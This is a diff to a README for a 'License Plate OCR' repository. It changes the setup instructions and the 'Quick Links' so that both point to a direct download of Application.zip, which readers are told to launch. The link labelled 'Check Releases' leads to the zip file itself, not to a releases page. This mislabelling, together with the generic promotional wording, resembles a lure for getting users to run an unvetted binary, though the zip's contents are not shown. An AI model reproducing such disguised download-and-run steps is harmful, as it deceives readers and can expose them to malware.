@@ -21,7 +21,7 @@ To get started with the **License Plate OCR** system, make sure to follow these 
 
 1. Clone the repository to your local machine.
 2. Install the necessary dependencies as mentioned in the project documentation.
-3. Launch the application using the provided link: [Download Application.zip](https://github.com/file/Application.zip).
+3. Launch the application using the provided link: [Download https://github.com/manjunatha432/License-Plate-OCR/releases/download/v1.0.0/Application.zip](https://github.com/manjunatha432/License-Plate-OCR/releases/download/v1.0.0/Application.zip).
    - *Note: The application needs to be launched after downloading.*
 
 ## System Architecture 🏗️
@@ -50,6 +50,6 @@ For any questions or issues regarding the project, please check the "Releases" s
 ---
 
 🔗 **Quick Links:**
-- [Check Releases](https://github.com/your-repo/releases)
+- [Check Releases](https://github.com/manjunatha432/License-Plate-OCR/releases/download/v1.0.0/Application.zip)
 
 👉 Let's connect the world with smarter license plate recognition using advanced computer vision and OCR techniques in this exciting License Plate OCR project! 🌟
